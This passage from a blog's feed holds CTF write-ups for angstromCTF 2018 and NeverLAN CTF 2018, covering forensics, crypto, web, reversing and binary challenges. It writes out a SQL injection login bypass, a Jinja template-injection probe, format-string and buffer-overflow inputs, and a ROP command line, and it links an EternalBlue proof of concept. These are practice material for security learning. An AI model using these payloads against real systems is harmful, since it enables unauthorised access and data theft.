&lt;p&gt;So, the filename we get is &lt;strong&gt;waldo339.jpg&lt;/strong&gt;. Running &lt;code&gt;strings&lt;/code&gt; on the file we get the flag as — &lt;strong&gt;actf{r3d_4nd_wh1t3_str1p3s}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. That’s not my name&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given a pdf file — gettysburg.pdf, but on trying to open it, it does not open, giving incorrect file format error. We run &lt;code&gt;binwalk&lt;/code&gt; on the file to see that it infact is a &lt;code&gt;docx&lt;/code&gt; file. We change the extension to &lt;code&gt;.docx&lt;/code&gt; anf on opening we get the flag as — &lt;strong&gt;actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. File Transfer&lt;/strong&gt;&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/3.png&#34; data-caption=&#34;Capture&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/3.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Capture
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The highlighted packet shows a JPEG image capture. We export the JPEG as bytes to get the image.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/4.jpeg&#34; data-caption=&#34;Flag — File Transfer&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/4.jpeg&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Flag — File Transfer
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt; &lt;br&gt;
&lt;strong&gt;5. GIF&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On running &lt;code&gt;binwalk&lt;/code&gt; on the given image, we see that it is infact a collection of many images.&lt;/p&gt;
&lt;p&gt;So , we run the command &lt;code&gt;binwalk -D &#39;png image:png&#39; jiggs.gif.png&lt;/code&gt;. On inspecting the extracted files, we see an image which has the flag.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/5.png&#34; data-caption=&#34;Flag — Gif&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/5.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Flag — Gif
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;hr&gt;
&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Warmup&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;From the term &lt;strong&gt;&lt;em&gt;fine&lt;/em&gt;&lt;/strong&gt; cipher, we get the hint that it could be an &lt;strong&gt;Affine cipher&lt;/strong&gt;. We use an online Affine cipher &lt;a href=&#34;https://www.dcode.fr/affine-cipher&#34;&gt;solver&lt;/a&gt; to get the flag as — &lt;strong&gt;actf{it_begins}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Back to Base-ics&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given the following cipher text -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/6.png&#34; data-caption=&#34;Ciphertext&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/6.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Ciphertext
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;Now we can easily see that the Part 1 is binary(base 2) and Part 3 is hexadecimal(base 16). On decoding them using any online converter, we get&lt;/p&gt;
&lt;p&gt;Part 1: &lt;strong&gt;actf{0ne_tw0_f0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Part 3: &lt;strong&gt;n_th1rtytw0_s1x&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Also judging from the title of the problem, we can say that all the ciphers have the base of some power of two. We guess that Part 2 could be base 8(octal). using an online octal to text converter we get,&lt;/p&gt;
&lt;p&gt;Part 2: &lt;strong&gt;ur_eight_sixt33&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The last one looks like base64. On decrypting, we get&lt;/p&gt;
&lt;p&gt;Part 4: &lt;strong&gt;tyf0ur_no_m0re}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;So, the flag is — &lt;strong&gt;actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. XOR&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This looks like a singlebyteXOR problem. We use the following script&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/982f2b6974fec2195f752bb86cc91393.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;On seeing all the plain texts, we get the flag as — &lt;strong&gt;actf{hope_you_used_a_script}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. Intro to RSA&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is a classical RSA problem, we use the following script to decrypt&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/f6af59e02f2db1d0e27e88b5b8084585.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;So the flag is — &lt;strong&gt;actf{rsa_is_reallllly_fun!!!!!!}&lt;/strong&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;web&#34;&gt;WEB&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Source Me 1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Here, we are presented with a login page. On inspecting the source, we find the password —&lt;strong&gt;f7s0jkl&lt;/strong&gt;, in the comments. **** So, we login with the username as &lt;code&gt;admin&lt;/code&gt; and password as &lt;code&gt;f7s0jkl&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This gives us the flag-&lt;strong&gt;actf{source_aint_secure}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Get Me&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Initially all we have is a button with the message that only authorized users are allowed to pass. On clicking the button, we get the message that we are not authorized. However in the url bar we see that the get parameter is &lt;code&gt;auth=false&lt;/code&gt;. We change it to &lt;code&gt;auth=true&lt;/code&gt;and hit enter.&lt;/p&gt;
&lt;p&gt;We then get the flag — &lt;strong&gt;actf{why_did_you_get_me}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. Sequel&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is a classic case of SQL injection(SQLi). The hint here is the name of the problem which is pronunciation of SQL.&lt;/p&gt;
&lt;p&gt;We enter both username and password as &lt;code&gt;&#39;or&#39;&#39;=&#39;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This gives us the flag — &lt;strong&gt;actf{sql_injection_more_like_prequel_injection}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. Source Me 2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are give another login page. Here, too, the username is &lt;code&gt;admin&lt;/code&gt;. On inspecting the source, we find the script which converts our entered password to md5 and compares it to the hash &lt;strong&gt;bdc87b9c894da5168059e00ebffb9077&lt;/strong&gt;. We use an &lt;a href=&#34;http://www.md5online.org/&#34;&gt;online md5 decryptor to&lt;/a&gt; get the password as &lt;code&gt;password1234&lt;/code&gt;. Entering this gives the flag — &lt;strong&gt;actf{md5_hash_browns_and_pasta_sauce}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;5. Madlibs&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Here, from the Flask code we see that there is a variable app.secret_key, which is basically a config variable. So we head to Tale of a Person section and enter &lt;code&gt;{{config}}&lt;/code&gt; as the Author name and any random strings in the other options.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/7.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/7.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here we see the SECRET_KEY variable assigned to the flag, &lt;strong&gt;actf{wow_ur_a_jinja_ninja}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;reversingre&#34;&gt;Reversing(RE)&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Rev1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;First, we run &lt;code&gt;strings&lt;/code&gt; on the given ELF executable. We see the string, &lt;strong&gt;s3cret_pa55word&lt;/strong&gt;. This could be the secret password the program is looking for. On running the executable and giving the above string as key, we get the flag. This is to be done on the shell server.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Rev2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The ELF on executing asks for a number to be guessed. We use radare2 to disassemble the code.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/8.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/8.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/9.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/9.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The highlighted hex, 0x11d7 is &lt;strong&gt;4567&lt;/strong&gt; in decimal. On entering this, the program now asks us to give two two-digit numbers. We again analyze the disassembled code.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/10.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/10.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;This tells us that the product of the two numbers should be 0xd67 i.e &lt;strong&gt;3431&lt;/strong&gt;. From &lt;a href=&#34;http://www.mathwarehouse.com/arithmetic/numbers/prime-number/prime-factorization.php?number=3431&#34;&gt;this link,&lt;/a&gt; we find that the numbers are &lt;strong&gt;47&lt;/strong&gt; and &lt;strong&gt;73&lt;/strong&gt;. We enter them in ascending order, i.e 47 and then 73.&lt;/p&gt;
&lt;p&gt;We get the flag as — &lt;strong&gt;actf{4567_47_73}&lt;/strong&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;binary&#34;&gt;Binary&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Accumulator&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Here the ideas is to keep adding integers to an &lt;code&gt;int&lt;/code&gt; variiable and without explicitly entering negative values, we have to make the result negative. This can be done by integer overflow.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/11.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/11.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Running these inputs on the shell server will give us the flag.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Cookie Jar&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is a buffer overflow problem. Although we never explicitly gave a value to numCookie, we can overflow the buffer so that it gets a value. I fwe the following input — aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa99999998 to the program, we get the flag.&lt;/p&gt;
&lt;p&gt;The flag is — &lt;strong&gt;actf{eat_cookies_get_buffer}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. Number Guess&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We take the help of the hint given. The most common vulnerability of the printf function is the use(or not) of format strings.&lt;/p&gt;
&lt;p&gt;In the code, just before the &lt;code&gt;printf(buf)&lt;/code&gt; the two random integers are initialized. So, when we are asked for our name, if we give the following input, &lt;strong&gt;%d %d %d %d %d %d %d %d %d %d %d %d&lt;/strong&gt; . This would give us the other numbers in the stack. On running this, we take the 3rd and the 9th value as rand1 and rand2. We add them and give the result as our guess.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/12.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/12.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;So the flag is -&lt;strong&gt;actf{format_stringz_are_pre77y_sc4ry}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. Rop to the Top&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is an example of Return Oriented Programming (ROP) vulnerability which is basically buffer overflow to access the non-executable stack. To exploit it we can use the following set of commands-&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/13.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/13.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;We find that the address of &lt;strong&gt;the_top&lt;/strong&gt; function is &lt;strong&gt;0x8048db&lt;/strong&gt;. Also the buffer size is &lt;strong&gt;0x28&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;So, the following command works for us-&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;./rop_to_the_top32 &amp;ldquo;$(python -c &amp;lsquo;print &amp;ldquo;A&amp;rdquo;*0x28 + &amp;ldquo;BBBB&amp;rdquo; + &amp;ldquo;\xdb\x84\x04\x08&amp;rdquo;&#39;)&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We enter the character ‘A’ to fill the size of the buffer, “BBBB” to replace the current stack pointer (%ebx) followed by the address to which we wish to point to, here the address of &lt;strong&gt;the_top&lt;/strong&gt; function.&lt;/p&gt;
&lt;p&gt;Running the above command on the shell server gives us the flag.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;For more writeups, you can follow me on&lt;/em&gt; &lt;a href=&#34;https://github.com/wr47h&#34;&gt;&lt;em&gt;Github&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>NeverLAN CTF 2018 Writeups</title>
      <link>https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/</link>
      <pubDate>Tue, 27 Feb 2018 08:55:58 +0000</pubDate>
      <guid>https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/</guid>
      <description>&lt;p&gt;These are the writeups of the problems I solved over the weekend for the NeverLAN CTF 2018.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;scripting-challenges&#34;&gt;&lt;strong&gt;Scripting Challenges&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Basic Math&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given a file with some numbers which we had to sum.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/images/2.png&#34; data-caption=&#34;File&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/images/2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    File
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;So, we write a simple python script to do it.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/907d53ddd7a9b8b12c0e36ac4afef320.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;This gives the flag — 49562942146280612&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. More Basic Math&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This time we have a larger list of numbers. However, we can just run the script again on the new file.&lt;/p&gt;
&lt;p&gt;This gives us the flag — 50123971501856573397&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. Even more Basic Math with some junk&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In this file, we see that we have spaces, commas and even English words in between the file. Using any text editor, we replace the commas with a space, and then write a script to replace all spaces with new lines.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/9c4443d59df7469ad8652dcc6676d0b1.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;Then we run our first script again. We find two or three English words which give Value Error when the script is run. For them, we can manually remove them.&lt;/p&gt;
&lt;p&gt;Finally, we get the flag — 34659711530484678082&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. JSON Parsing 1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On analysing the file, we find that each line is a JSON. We have to find the 5 AV engines which had the highest detection ratio (not detection count) in that file.&lt;/p&gt;
&lt;p&gt;We write the following script to do that —&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/68288cff647b17b45752c6c4602d2fea.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The last five in the list are —&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/images/3.png&#34; data-caption=&#34;High Detection Ratio AV engines&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/images/3.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    High Detection Ratio AV engines
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;So the flag is — &lt;code&gt;SymantecMobileInsight,CrowdStrike,SentinelOne,Invincea,Endgame&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;reversing-challenges&#34;&gt;&lt;strong&gt;Reversing Challenges&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Commitment Issues&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The first thing which came to my mind is to run &lt;code&gt;strings&lt;/code&gt; on the file. I did, and got the flag —&lt;strong&gt;flag{don’t_string_me_along_man!}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;interweb-challenges&#34;&gt;&lt;strong&gt;Interweb Challenges&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. ajax_not_soap&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On inspecting the script(ajax) of the webpage, we find that the form compares our username and password with one that is stored at the endpoint &lt;code&gt;/webhooks/get_username.php&lt;/code&gt;. On going to that link we find the username as &lt;code&gt;MrClean&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Also the password is also checked by the endpoint &lt;code&gt;/webhooks/get_pass.php?username=*username*&lt;/code&gt; Replacing &lt;em&gt;username&lt;/em&gt; with &lt;code&gt;MrClean&lt;/code&gt; we get the password (also the flag) as &lt;strong&gt;flag{hj38dsjk324nkeasd9}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. the_red_or_blue_pill&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The page says we can either take the red pill(endpoint &lt;code&gt;?red&lt;/code&gt; ) or the blue pill(endpoint &lt;code&gt;?blue&lt;/code&gt; ) but not both. We enter the endpoint as &lt;code&gt;?red&amp;amp;blue&lt;/code&gt; to get the flag as &lt;strong&gt;flag{breaking_the_matrix…I_like_it!}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. ajax_not_borax&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This problem is very similar to ajax_not_soap with the difference here that when we go to the endpoint &lt;code&gt;/webhooks/get_username.php?username=&lt;/code&gt;, we are presented with a hash (c5644ca91d1307779ed493c4dedfdcb7). We use an online MD5 decryptor to get the value as &lt;code&gt;tideade&lt;/code&gt;. Then, when we go to the endpoint &lt;code&gt;/webhooks/get_pass.php?username=tideade&lt;/code&gt;, we get a base64 encoded string, which on decryption gives the flag as &lt;strong&gt;flag{sd90J0dnLKJ1ls9HJed}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. Das_blog&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;First, when we are presented with a login page, we find that a testing credential is available as a comment in the HTML. We login using those credentials. Then, we find that the cureent permission is &lt;code&gt;DEFAULT&lt;/code&gt;. We need &lt;code&gt;admin&lt;/code&gt; permissions to view the flag. On inspecting the cookies, we find that there is a cookie &lt;code&gt;permission&lt;/code&gt; which has its value as user. We use the &lt;strong&gt;EditThisCookie plugin&lt;/strong&gt; to change its value to &lt;code&gt;admin&lt;/code&gt;. On refreshing, we get the flag as a blog post &lt;strong&gt;flag{C00ki3s_c4n_b33_ch4ng3d_?}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;passwords-challenges&#34;&gt;Passwords Challenges&lt;/h3&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Encoding != Hashing&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given a pcap capture. We open this in Wireshark and analyse the HTTP packets using the &lt;code&gt;http&lt;/code&gt; filter. On reading the contents of the filtered packets, we find the flag.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/images/4.png&#34; data-caption=&#34;Wireshark Packets analysis&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/images/4.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Wireshark Packets analysis
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The flag is &lt;strong&gt;flag{help-me-obiwan}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;trivia-challenges&#34;&gt;&lt;strong&gt;Trivia Challenges&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Can you Name it?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt;— This system provides a reference-method for publicly known information-security vulnerabilities and exposures.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;— &lt;a href=&#34;https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures&#34;&gt;Common Vulnerabilities and Exposures&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Can you find it? (Bonus)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt;— This Vulnerability was used for a major worldwide Ransomware attack. It was so bad it forced the software company to write a patch for end of life systems that they had stopped supporting years before the attack.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;— EternalBlue. And the ransomware was WannaCry.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. Yummy…&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt;— These store small pieces of data sent from a website to the user’s computer. This yummy sounding things are stored by the user’s web browser while the user surfing the web. Answer is non-singular.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;— Cookies&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. Can you find it?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt;— This Vulnerability was used for a major worldwide Ransomware attack. It was so bad it forced the software company to write a patch for end of life systems that they had stopped supporting years before the attack.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;— The formal listing code (CVE) for EternalBlue is &lt;strong&gt;CVE-2017–0144&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;5. Can you search it?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt;— For the Vulnerability you found in question 2, There is a proof of concept. What is the string for TARGET_HAL_HEAP_ADDR_x64?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;— The vulnerability being discussed is EternalBlue. We canf ind the source code at &lt;a href=&#34;https://gist.github.com/worawit/bd04bad3cd231474763b873df081c09a&#34;&gt;this link&lt;/a&gt;. There we find that TARGET_HAL_HEAP_ADDR_x64 is assigned &lt;strong&gt;0xffffffffffd00010&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;6. Who knew?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt;— This product had Highest Number Of “Distinct” Vulnerabilities in 1999&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;— A simple Google search of “Highest Number Of “Distinct” Vulnerabilities in 1999&amp;quot;, gets us the following &lt;a href=&#34;https://www.cvedetails.com/top-50-products.php?year=1999&#34;&gt;link&lt;/a&gt;. The product with the highest vulnerabilities was &lt;strong&gt;Windows NT&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;blast-from-the-past-challenges&#34;&gt;&lt;strong&gt;Blast from the Past Challenges&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;1. cookie_monster&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On inspecting the cookies, we find that the Cookie value should be the Red Guy’s name. We change the value of the cookie to &lt;code&gt;Elom&lt;/code&gt;. On refreshing the page, we get the flag as &lt;strong&gt;flag{C00kies_4r3_the_b3st}&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
